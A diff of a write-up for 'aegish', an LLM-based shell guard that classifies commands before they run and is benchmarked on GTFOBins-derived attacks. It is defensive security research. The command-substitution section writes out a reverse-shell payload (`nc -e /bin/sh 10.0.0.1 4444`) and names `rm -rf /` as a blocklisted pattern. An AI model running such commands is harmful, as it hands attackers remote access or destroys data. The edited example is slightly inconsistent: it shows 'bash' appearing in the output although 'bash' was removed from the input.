@@ -9,17 +9,18 @@
 * 9 LLMs from 4 providers were benchmarked on their ability to distinguish intent: they were tasked to **BLOCK** 676 harmful commands (extracted from GTFOBins) and to correctly classify 496 harmless commands as either **ALLOW** or **WARN**.
 * The harmless benchmark proved to be saturated (96.8–100% harmless acceptance rate for all models). The real differentiator was the malicious detection rate, where **4 of 9 models exceeded 95%**.
 * Surprisingly, **mid-size models outperform flagships**. GPT-5 Mini beats GPT-5.1, and Claude Haiku 4.5 beats both Claude Opus 4.6 and Claude Sonnet 4.5, suggesting that for this specific task, model reasoning capability is not the primary bottleneck.
-* Beyond the LLM, *aegish* includes several safeguards — Landlock kernel enforcement, SHA-256 binary integrity checks, role-based trust levels, audit logging, and rate limiting — many of which were directly motivated by bypass vectors discovered during security audits. However, the system as a whole has not been hardened to the level required for adversarial deployment.
+* Beyond the LLM, *aegish* includes several safeguards — input canonicalization, command substitution resolution, script inspection, and role-based trust levels — many of which were directly motivated by bypass vectors discovered during security testing. However, the system as a whole has not been hardened to the level required for adversarial deployment.
 
 [^name]: *aegish* = **aegis** + **sh**. In Greek mythology, the Aegis was a protective shield carried by Athena and Zeus — the word has since come to mean being under the protection of a powerful, knowledgeable, and benevolent source. **sh** is short for "shell."
+[^kernel]: The **kernel** is the core of the operating system — it manages hardware, memory, and processes. **Kernel-level enforcement** means the security restriction is applied by the kernel itself, so no user-space program can bypass or override it.
 
 ## 1. Introduction
 
 Linux security traditionally relies on mature, battle-tested tools like **SELinux** or **AppArmor**. These are **Mandatory Access Control (MAC)** systems: security policies enforced by the OS itself that no user or process can override. They operate as strict "bouncers," defining exactly which files a process can read and which network ports it can access. While highly effective, they impose a significant maintenance burden. Many systems run with policies far more permissive than they should be — not because the tools lack capability, but because the expertise and maintenance burden is enormous ([Pahuja et al., 2023](https://arxiv.org/abs/2312.04586)).
 
-*aegish* targets **enterprise sysadmins who lack deep security knowledge** and need affordable, easy-to-use protection for production servers. It takes a different approach: **use an LLM to reason about what a command means before letting it run**, complemented by static analysis and kernel-level enforcement. Before any command reaches the LLM, a static analysis layer blocks deterministic threats with zero latency (see Appendix M for more details). After the LLM classifies a command, [Landlock](https://landlock.io/) — a Linux security module — provides a kernel-level safety net by denying execution of shell binaries (e.g., `bash`) from within child processes, so that even if a command passes validation and then attempts to spawn an unmonitored shell at runtime, the kernel blocks it. The proposed value of this approach is:
+*aegish* targets **enterprise sysadmins who lack deep security knowledge** and need affordable, easy-to-use protection for production servers. It takes a different approach: **use an LLM to reason about what a command means before letting it run**, complemented by static analysis and kernel-level enforcement[^kernel]. Before any command reaches the LLM, a static analysis layer blocks deterministic threats with zero latency (see Appendix M for more details). After the LLM classifies a command, [Landlock](https://landlock.io/) — a Linux security module — provides a kernel-level safety net by denying execution of shell binaries (e.g., `bash`) from within child processes, so that even if a command passes validation and then attempts to spawn an unmonitored shell at runtime, the kernel blocks it. The proposed value of this approach is:
 1. **Low expertise barrier:** Unlike AppArmor profiles, SELinux policies, or sudo rules, there is no specialized policy language to learn. The LLM reasons about intent from the command text alone — anyone who can describe a threat in English can update the defense.
-2. **Easy to configure:** There are no per-binary or per-resource policies to write. The security logic is a natural-language prompt, not a ruleset. When new attack patterns emerge, updating the prompt is faster than writing MAC policy rules.
+2. **Easy to configure:** There are no per-binary or per-resource policies to write. The security logic is a natural-language prompt. When new attack patterns emerge, updating the prompt is faster than writing MAC policy rules.
 3. **Block before execution:** Static rules and the LLM flag catastrophic actions before they run, not after. There is no forensic analysis of damage already done — the damage simply doesn't happen.
 4. **Interpretability:** When the LLM flags something suspicious, it provides a natural-language explanation of *why*, removing the human bottleneck of manually reviewing every alert.
 5. **Keeping pace with AI-driven attacks:** LLMs are increasingly capable of discovering security vulnerabilities, including previously unknown zero-days in mature, well-tested codebases ([Anthropic, 2026](https://red.anthropic.com/2026/zero-days/)). Integrating LLMs into defenses may be a necessary step to keep up with their growing capability as offensive tools.
@@ -29,14 +30,14 @@ The claim is not that this replaces tools like SELinux or AppArmor. It is that a
 
 The results show that the approach works — but with clear boundaries. All 9 models allowed 96.8–100% of harmless commands, saturating the harmless benchmark and providing no signal. The real differentiator was malicious detection rate, where **4 of 9 models exceeded the 95% target**: Gemini 3 Flash (97.8%), Llama Primus (96.4%), GPT-5 Mini (95.9%), and Claude Haiku 4.5 (95.7%). Surprisingly, **mid-size models consistently outperformed flagships** across both OpenAI and Anthropic families — GPT-5 Mini beats GPT-5.1, and Claude Haiku 4.5 beats both Opus 4.6 and Sonnet 4.5. Cost and latency analyses reinforce this: Opus costs 11.5x more than Gemini 3 Flash for a *lower* detection rate.
 
-Security testing (Section 5) uncovered architectural bypass vectors that benchmarking could not surface, directly shaping the non-LLM defense layers described in Section 2. 
+Security testing revealed bypass vectors that benchmarking alone could not surface, directly informing non-LLM defenses like input canonicalization to prevent command obfuscation.
 
 However, the approach also inherits fundamental LLM limitations (detailed in Section 7): non-deterministic responses, added latency, and susceptibility to prompt injection — and several structural bypasses identified during security testing remain unmitigated.
 
 The **contributions** of this project are:
 1. **The approach itself:** A new integration of LLM reasoning, static analysis, and kernel enforcement into an interactive shell — combining capabilities that prior work addresses only in isolation.
-2. **A working prototype:** A functional shell that can be extended toward production deployment.
-3. **The benchmark:** 676 curated malicious commands across 8 GTFOBins categories with placeholder normalization plus a 496-command harmless set. This dataset and methodology can be reused by others working on the same problem.
+2. **The implementation of a working prototype:** A functional shell that can be extended toward production deployment.
+3. **The benchmark:** 676 curated malicious commands across 8 GTFOBins categories with placeholder normalization plus a harmless set with 496 commands. This dataset and methodology can be reused by others working on the same problem.
 4. **Model selection data:** Concrete cost, latency, harmless acceptance and malicious detection rate comparisons across 9 models from 4 providers.
 
 ## 2. How It Works
@@ -50,7 +51,7 @@ The complete flow is shown in Figure 1.
 
 
 
-![Flow diagram](https://i.imgur.com/823aSQy.png)
+![Flow diagram](https://i.imgur.com/s9uILdq.png)
 
 *Figure 1: aegish command flow. Commands pass through static validation, then the LLM classifies them.*
 
@@ -112,7 +113,9 @@ When a user types a command, it passes through the following stages before a dec
 
 2. **Static validations:** Before any command reaches the LLM, a static analysis layer catches patterns that don't require semantic reasoning. This includes, for example, a **regex blocklist** that matches known-dangerous signatures such as destructive operations (`rm -rf /`). The rest of the components in this layer are detailed in Appendix M.
 
-3. **Command substitution resolution:** In bash, you can embed one command inside another using the `$(...)` syntax. Bash runs the inner command first, then pastes its output into the outer command before executing it. For example, suppose a file `a.sh` contains the text `nc -e /bin/sh 10.0.0.1 4444` (a reverse shell that gives an attacker remote access). The command `bash $(cat a.sh)` first runs `cat a.sh` — which reads the file and outputs its contents — and then substitutes that output in, producing `bash nc -e /bin/sh 10.0.0.1 4444`. The problem is that the LLM would only see the original text `bash $(cat a.sh)`, which looks like an innocent script execution — the malicious payload is hidden inside the file. To address this, *aegish* extracts the inner command, validates it through the full pipeline, and — if it passes — executes it in a sandboxed subprocess. The inner command's output then replaces the `$(...)`, so the LLM evaluates the resolved command and can recognize the reverse shell.
+3. **Command substitution resolution:** In bash, you can embed one command inside another using the `$(...)` syntax. Bash runs the inner command first, then pastes its output into the outer command before executing it. For example, suppose a file `a.sh` contains the text `nc -e /bin/sh 10.0.0.1 4444` (a reverse shell that gives an attacker remote access). The command `$(cat a.sh)` first runs `cat a.sh` — which reads the file and outputs its contents — and then substitutes that output in, producing `bash nc -e /bin/sh 10.0.0.1 4444`. The problem is that the LLM would only see the original text `$(cat a.sh)`, which looks like an innocent script execution — the malicious payload is hidden inside the file. To address this, *aegish* extracts the inner command, validates it through the full pipeline, and — if it passes — executes it in a sandboxed subprocess. The inner command's output then replaces the `$(...)`, so the LLM evaluates the resolved command and can recognize the reverse shell. This process is repeated recursively until no nested substitutions remain, a depth limit is reached, or an inner command is blocked or warned.
+
+4. **Script inspection:** When a command references a script file (e.g., `source deploy.sh`, `python3 script.py`), *aegish* reads the script's contents and includes them in the LLM prompt so the model can reason about what will actually execute and not just the invocation command.
 
 After those steps, the resolved command, along with all context gathered in prior stages, is sent to the LLM for evaluation. 
 
@@ -122,9 +125,8 @@ After those steps, the resolved command, along with all context gathered in prio
 
 **Role-based trust levels:** Sessions are assigned one of three roles: *default*, *sysadmin*, or *restricted* — which modify the LLM's decision logic via role-specific prompt additions (see Appendix O for the full prompts).
 
-**Script inspection:** When a command references a script file (e.g., `source deploy.sh`, `python3 script.py`), *aegish* reads the script's contents and includes them in the LLM prompt so the model can reason about what will actually execute and not just the invocation command.
 
-Additional system-level safeguards, such as health check failover, rate limiting, audit logging, and others, are detailed in Appendix L.
+Additional safeguards, such as health checks, rate limiting, audit logging, and others, are detailed in Appendix L.
 
 ## 3. The Benchmark
 
@@ -148,7 +150,7 @@ A target rate of 95% was established for both metrics, with error bars represent
 
 ### Models Tested
 
-9 models from 4 providers were selected to span a range of sizes, costs, and architectures. The full list with selection rationale is in Appendix N.
+9 models from 4 providers were evaluated. The full list with selection rationale is in Appendix N.
 
 ## 4. Results
 
